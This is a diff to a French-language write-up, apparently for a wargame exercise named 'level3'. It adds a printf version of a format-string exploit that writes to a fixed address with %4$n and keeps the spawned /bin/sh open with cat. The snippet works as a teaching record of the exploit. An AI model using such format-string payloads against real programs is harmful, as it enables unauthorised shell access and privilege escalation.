@@ -42,6 +42,7 @@ Compter sa position → ici c'est la **4ème**.
 
 ```bash
 (python -c 'print "\x8c\x98\x04\x08%60c%4$n"'; cat) | ./level3
+(printf '\x8c\x98\x04\x08%%60x%%4$n'; cat) | ./level3
 ```
 
 Le `cat` garde le shell ouvert après le `system("/bin/sh")`.
